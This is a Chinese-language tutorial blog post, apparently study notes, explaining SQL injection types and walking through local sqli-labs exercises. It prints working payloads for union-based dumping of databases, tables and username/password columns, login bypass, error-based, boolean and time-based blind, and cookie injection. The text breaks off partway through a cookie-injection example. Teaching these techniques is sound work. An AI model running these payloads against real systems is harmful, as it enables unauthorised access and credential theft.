+++
title = "SQL注入"
date = 2021-06-07

[taxonomies]
categories = ["安全"]
+++

# 什么是SQL注入？
SQL注入是服务器端**未严格校验**客户端发送的数据，而导致服务端SQL语句被**恶意修改**并**成功执行**的行为称为SQL注入。
# 为什么会有SQL注入

- 代码对带入SQL语句的参数过滤不严格
- 未启用框架的安全配置，例如：PHP的magic_quotes_gpc
- 未使用框架安全的查询方法
- 测试接口未删除
<!-- more -->
- 未启用防火墙
- 未使用其他的安全防护设备
# SQL注入的业务场景及危害
Web页面一般存在SQL注入的业务场景为登录功能、搜索功能、商品购买、文件上传等与数据库有交互的场景。这些场景一但被SQL注入，则可能会导致数据库中存放的用户的隐私信息被泄露、网页被篡改、网站被挂马、数据库被恶意篡改、服务器被远程控制等影响。

**任何和数据库产生交互的地方便有可能存在注入**
# SQL注入的分类
## 按照请求方法分类

- GET型注入
- POST型注入
## 按照SQL数据类型分类

- 整型注入
- 字符型注入

- 报错注入
- 双注入
- 布尔盲注
- 时间盲注
- Cookie注入
- User-Agent注入
# SQL注入步骤：
首先判断业务逻辑

1. 判断是否有注入（判断是否未严格校验） -->第一要素
   1. 可控参数的改变能否影响页面的显示结果
   1. 输入的SQL语句是否能报错（能通过数据库的报错，看到数据库的一些语句痕迹）
   1. 输入的SQL语句能否不报错（我们的语句能否成功闭合）
2. 什么类型的注入
2. 语句是否能够被恶意修改 -->第二个要素
2. 是否能够成功执行 -->第三个要素
2. 获取我们想要的数据
# mysql数据库结构
数据库->表->字段->值<br />![4e29459c94a9c70836fdb25446a9870f.jpeg](https://cdn.nlark.com/yuque/0/2021/jpeg/2424924/1623143045202-33519c45-7b2e-4d51-83fc-a27c54e7ab77.jpeg#crop=0&crop=0&crop=1&crop=1&height=695&id=qMhCG&margin=%5Bobject%20Object%5D&name=4e29459c94a9c70836fdb25446a9870f.jpeg&originHeight=695&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49584&status=done&style=none&title=&width=970)
# SQL注入实战
## 整型注入
![截屏2021-06-08 下午4.37.29.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623143440305-737b846e-54c0-498e-8d5e-e9ec0250ce47.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=WREuD&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%884.37.29.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1572033&status=done&style=none&title=&width=2604)<br />添加单引号，根据报错，判断注入类型

首先判断此SQL语句所查询的数据有几列（或者使用order by二分法）<br />http://127.0.0.1:8081/Less-2/?id=4 union select 1,2,3 %23<br />![截屏2021-06-08 下午5.19.53.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623144018746-c60e56ca-2153-4258-bf07-69514255b673.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=hEVSR&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.19.53.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=943778&status=done&style=none&title=&width=2604)<br />判断页面输出的是所查询的哪一个数据（判断位置）<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,user(),3 %23<br />![截屏2021-06-08 下午5.21.33.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623144112212-251d7e84-00e4-4cd4-ab08-b9cdb79a7bc9.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=V3jG2&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.21.33.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=948626&status=done&style=none&title=&width=2604)<br />查询数据库<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,user(),schema_name from information_schema.schemata %23<br />![截屏2021-06-08 下午5.25.38.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623144360178-c6088b48-b4f9-4244-bdbb-baac1bc6d064.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=ywtBf&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.25.38.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=969857&status=done&style=none&title=&width=2604)<br />页面只输出一个数据库，若要全部输出，则用group_concat()函数<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,user(),group_concat(schema_name) from information_schema.schemata %23<br />![截屏2021-06-08 下午5.28.00.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623144501163-de4bb2a8-6d40-45ff-ab55-3680b52db3b3.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=wlYz8&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.28.00.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=986064&status=done&style=none&title=&width=2604)<br />查询当前数据库名<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,database(),group_concat(schema_name) from information_schema.schemata %23<br />![截屏2021-06-08 下午5.30.15.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623144636510-29e3fe63-da0e-429f-844d-a2ebe2d8814a.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=sn9wV&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.30.15.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=985677&status=done&style=none&title=&width=2604)<br />查询当前数据库下的所有表名<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() %23<br />![截屏2021-06-08 下午5.33.59.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623144850589-04414fed-b9de-4ce4-b0bf-3d325d039650.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=PPELq&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.33.59.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=976361&status=done&style=none&title=&width=2604)<br />查询users表下的字段名<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' %23<br />![截屏2021-06-08 下午5.37.08.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623145039834-7743dbdb-44c1-44fc-803a-398a0b1c29a0.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=BOXoM&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.37.08.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=984305&status=done&style=none&title=&width=2604)<br />查询username和password<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,group_concat(username),group_concat(password) from security.users %23<br />![截屏2021-06-08 下午5.40.18.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623145230171-fcca620a-5358-4912-b0b5-e8fd545d161b.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=mHvG7&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.40.18.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=923763&status=done&style=none&title=&width=2604)<br />或者<br />http://127.0.0.1:8081/Less-2/?id=99999 union select 1,group_concat(concat_ws(':',username,password)),3 from security.users %23<br />![截屏2021-06-08 下午5.44.12.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623145467593-1f9c56c9-2407-405f-b59f-74d8af29c466.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=mswHR&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.44.12.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1011728&status=done&style=none&title=&width=2604)
## POST注入
![截屏2021-06-08 下午5.49.32.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623145784299-641581fa-cd80-42e6-b140-4c644a212f1f.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=mGcwi&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.49.32.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=307022&status=done&style=none&title=&width=2604)<br />尝试在Username处输入 ' or 1 #<br />登录成功<br />![截屏2021-06-08 下午10.11.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623161583451-795502a6-6225-474e-861a-3d6e2970ee5c.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=W9W7r&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.11.44.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=830117&status=done&style=none&title=&width=2604)<br />尝试利用hackbar，检查网页源码，发现post请求提交的用户名和密码的name分别为uname和passwd<br />![截屏2021-06-08 下午10.15.31.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623161829379-837adf4f-c071-492b-806d-829f43f17b5b.png#crop=0&crop=0&crop=1&crop=1&height=172&id=i3dTC&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.15.31.png&originHeight=172&originWidth=638&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36240&status=done&style=none&title=&width=638)<br />在hackbar的Body栏输入 uname=admin&passwd=admin<br />成功登陆<br />![截屏2021-06-08 下午10.20.49.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623162124274-99af2c64-255e-4426-8ee3-51e3614a2f77.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=M8s1X&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.20.49.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=689485&status=done&style=none&title=&width=2604)<br />burpsuite同理，略

利用union进行注入，Body中uname处填写 yyds' union select 1,database() #<br />![截屏2021-06-08 下午10.43.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623163437527-881276da-1eb0-47d1-afbc-050d380a9dbd.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=QMkKB&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%8810.43.44.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=710245&status=done&style=none&title=&width=2604)<br />可以看到数据库为security<br />通过分析可以得出，这里的SQL语句为<br />@$sql="SELECT username, password FROM users WHERE username='admin'or'1'='1# and password='$passwd' LIMIT 0,1";<br />前面yyds处应设置一个数据库中没有的用户名来使界面显示置空，从而填充union select查询得出的数据

---

使用报错注入<br />报错注入所使用的count(*)和group by的处理过程，是先由group by将数据分组，然后再由count(*)统计每一组的数量<br />输入<br />uname=admin' union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),version()) %23&passwd=123456<br />可以获得版本<br />![截屏2021-06-09 下午9.33.27.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623245642296-b84fc129-0651-45a2-9817-f0347d93add3.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=Bggd2&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%889.33.27.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=581324&status=done&style=none&title=&width=2604)<br />加入0x7e使结果更便于查看<br />uname=admin' union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),0x7e,version(),0x7e) %23&passwd=123456<br />![截屏2021-06-09 下午9.36.26.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623245800903-ae9dfc12-d26f-4ed8-81af-65a7a5e9f169.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=gOPe3&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%889.36.26.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=583136&status=done&style=none&title=&width=2604)<br />查询表名（将version()处改变即可）<br />uname=admin' union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e) %23&passwd=123456<br />![截屏2021-06-09 下午9.54.13.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623246866165-440f53e9-8ec1-4f3e-b928-a23aaa16c4b6.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=g33Ew&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%889.54.13.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=598452&status=done&style=none&title=&width=2604)<br />依次改变limit后的第一个数字，依次查询得出所有的表
## 字符型注入
（单引号、双引号、括号）<br />输入 ?id=1' 判断注入类型<br />![截屏2021-06-09 上午1.40.57.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623174071177-c2ab0a30-2ad8-472c-8052-3a0e77268446.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=jBmOy&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.40.57.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=678192&status=done&style=none&title=&width=2604)<br />![截屏2021-06-09 上午1.40.45.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623174086034-a809916f-e79b-4dbd-aaab-87de99c0fdcd.png#crop=0&crop=0&crop=1&crop=1&height=278&id=SqXEI&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.40.45.png&originHeight=278&originWidth=590&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15286&status=done&style=none&title=&width=590)<br />在错误回显中（两个单引号之间）判断处为单引号字符型注入<br />利用order by判断列数<br />![截屏2021-06-09 上午1.48.55.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623174588830-11676235-6277-40be-959c-704a80188ea0.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=VB74c&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.48.55.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=683065&status=done&style=none&title=&width=2604)<br />查询数据库名<br />http://127.0.0.1:8081/Less-1/?id=' union select 1,group_concat(schema_name),database() from information_schema.schemata --+<br />![截屏2021-06-09 上午1.55.11.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623174935213-9b2ff540-3ed7-4bd4-96e7-699e7a40782b.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=xYOuI&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%881.55.11.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=725225&status=done&style=none&title=&width=2604)<br />查询security库中的数据表名<br />http://127.0.0.1:8081/Less-1/?id=' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<br />![截屏2021-06-09 上午2.00.00.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623175217995-f57d3561-22f6-4c9b-9ca4-05c72ce00097.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=qAYVl&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.00.00.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=717345&status=done&style=none&title=&width=2604)<br />查询users表中的列<br />http://127.0.0.1:8081/Less-1/?id=' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name='users' --+<br />![截屏2021-06-09 上午2.04.46.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623175500990-1c4d8f0a-a667-4b6f-a7c0-43baea7a50fe.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=dOHPv&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.04.46.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=724281&status=done&style=none&title=&width=2604)<br />查询username和password<br />http://127.0.0.1:8081/Less-1/?id=' union select 1,group_concat(concat_ws(':',username,password)),database() from users  --+<br />![截屏2021-06-09 上午2.10.42.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623175866998-ae672970-7bdd-4f42-920b-31d68e1cf084.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=KkPSQ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.10.42.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=754091&status=done&style=none&title=&width=2604)

---

![截屏2021-06-09 上午2.15.15.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623176131530-e4ac76d8-658b-4b27-9c54-a022ee3b2461.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=Tk0Uq&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.15.15.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=856109&status=done&style=none&title=&width=2604)<br />同样的，根据报错判断所传递的数据被什么符号包裹<br />![截屏2021-06-09 上午2.15.01.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623176202580-2c2bc1ba-54f5-4cf6-846f-e0f738774484.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=oWyNY&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8A%E5%8D%882.15.01.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=941124&status=done&style=none&title=&width=2604)<br />http://127.0.0.1:8081/Less-4/?id=1“) %23<br />判断出1被“和）包裹，即 ("1")

剩余步骤与前两道相同，略
## 盲注
### 布尔盲注
![截屏2021-06-09 下午10.07.12.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623247647163-6c26d6d6-8aa0-4f14-a4f7-4ece5c6a6aa1.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=pTp71&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.07.12.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=890799&status=done&style=none&title=&width=2604)<br />输入<br />http://127.0.0.1:8081/Less-5/?id=1' and 0 %23<br />![截屏2021-06-09 下午10.05.50.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623247610627-bad53856-1458-4c10-ba2a-940bdd3adb1c.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=q8sYg&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.05.50.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=950839&status=done&style=none&title=&width=2604)<br />查询version<br />http://127.0.0.1:8081/Less-5/?id=0' or (select substr(version(),1,1)='5') %23<br />![截屏2021-06-09 下午10.15.05.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623248145606-35d260fe-c112-476c-b4ff-9bdb75f8489b.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=caIa9&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.15.05.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=973035&status=done&style=none&title=&width=2604)<br />获取到版本的第一个字符为5，以此类推获取全部字符即可<br />获取表名<br />http://127.0.0.1:8081/Less-5/?id=0' or ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e') %23<br />![截屏2021-06-09 下午10.31.52.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623249132290-0b35bcfc-aaf3-490c-9c3d-831b02ea02fd.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=u4Rze&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.31.52.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=983898&status=done&style=none&title=&width=2604)<br />或者将字符转换成ascii码数字用二分法进行判断<br />http://127.0.0.1:8081/Less-5/?id=0' or ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)>100) %23<br />![截屏2021-06-09 下午10.36.07.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623249435049-e6a851d6-aadf-47fd-8840-47085c21d0c2.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=C0Rgo&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.36.07.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=984656&status=done&style=none&title=&width=2604)<br />得到字符的ascii码为101，即e<br />http://127.0.0.1:8081/Less-5/?id=0' or ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101) %23<br />![截屏2021-06-09 下午10.39.32.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623249587368-f6ee8bbe-4714-4059-aafd-5a2d22b4f48f.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=NI5dB&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.39.32.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=984806&status=done&style=none&title=&width=2604)<br />依此类推判断其他字符即可<br />使用burpsuite爆破<br />抓包，设置变量<br />![截屏2021-06-09 下午10.49.07.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623250203802-f21235ee-4db8-4568-ba02-e3825f78fede.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=DTfyq&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.49.07.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=491805&status=done&style=none&title=&width=2696)<br />设置payload<br />![截屏2021-06-09 下午10.49.15.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623250224114-8637a251-a504-49ed-9577-bfa9130c2ea8.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=C9ahB&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.49.15.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=437522&status=done&style=none&title=&width=2696)<br />爆破后，按照包长排序，得到101<br />![截屏2021-06-09 下午10.49.32.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623250278410-b6677f14-ede8-4120-915c-89641c635422.png#crop=0&crop=0&crop=1&crop=1&height=1312&id=v2XbG&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.49.32.png&originHeight=1312&originWidth=1816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=374129&status=done&style=none&title=&width=1816)<br />依此类推即可<br />或者使用双字典爆破，一次性获取所有<br />![截屏2021-06-09 下午11.03.14.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623251011189-93a3c8f8-fa33-42e3-a1e5-d455678a9303.png#crop=0&crop=0&crop=1&crop=1&height=1312&id=QSq0b&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8811.03.14.png&originHeight=1312&originWidth=1816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=381768&status=done&style=none&title=&width=1816)
### 时间盲注
![截屏2021-06-10 上午1.05.08.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623258339277-0ac1f8c4-3475-4391-83b1-f1c26e9b3536.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=dzobv&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.05.08.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=887958&status=done&style=none&title=&width=2604)<br />利用sleep()函数的延时作用，来判断正误<br />输入<br />http://127.0.0.1:8081/Less-9/?id=1' or if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101,sleep(0.1),0) %23<br />![截屏2021-06-10 上午1.04.30.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623258302302-65dbc5ce-4f61-49b9-b80d-ba2fc7d9b319.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=DlOAz&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.04.30.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=989970&status=done&style=none&title=&width=2604)<br />依此类推
## cookie注入
![截屏2021-06-10 上午1.08.06.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623258516193-540c8aa0-ffb5-4868-aa72-9f1b6fb2974e.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=lOZMm&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.08.06.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=944597&status=done&style=none&title=&width=2604)<br />输入admin/admin登陆，获取cookie<br />![截屏2021-06-10 上午1.10.18.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623258687489-67f803f2-2159-4e1c-902f-ea56a3035770.png#crop=0&crop=0&crop=1&crop=1&height=1662&id=TDkZ7&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.10.18.png&originHeight=1662&originWidth=2604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1062092&status=done&style=none&title=&width=2604)<br />打开burpsuite抓包<br />![截屏2021-06-10 上午1.13.20.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623258837129-5040c3a8-bae5-45fd-9dee-b1c90ca1b35b.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=eBhv7&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.13.20.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=492319&status=done&style=none&title=&width=2696)<br />在burp中进行改包<br />![截屏2021-06-10 上午1.17.04.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623259056589-6beb203b-231e-4727-a395-b1279673e1d7.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=VhStB&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.17.04.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=566425&status=done&style=none&title=&width=2696)<br />判断出后台为单引号注入<br />order by 判断出为3列后，进行联合查询，判断出数据显示的位置<br />![截屏2021-06-10 上午1.24.00.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623259476559-cb938133-d3a5-4555-877d-3c541e1be2e1.png#crop=0&crop=0&crop=1&crop=1&height=1750&id=o5I13&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.24.00.png&originHeight=1750&originWidth=2696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=745156&status=done&style=none&title=&width=2696)<br />![截屏2021-06-10 上午1.24.48.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623259502452-7f7381e7-b256-4276-90d4-5b6c50051b21.png#crop=0&crop=0&crop=1&crop=1&height=170&id=tdItO&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.24.48.png&originHeight=170&originWidth=532&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30188&status=done&style=none&title=&width=532)<br />cookie的值为<br />Cookie: uname=admin' and 0 union select 99,group_concat(table_name),77 from information_schema.tables where table_schema=database() %23<br />![截屏2021-06-10 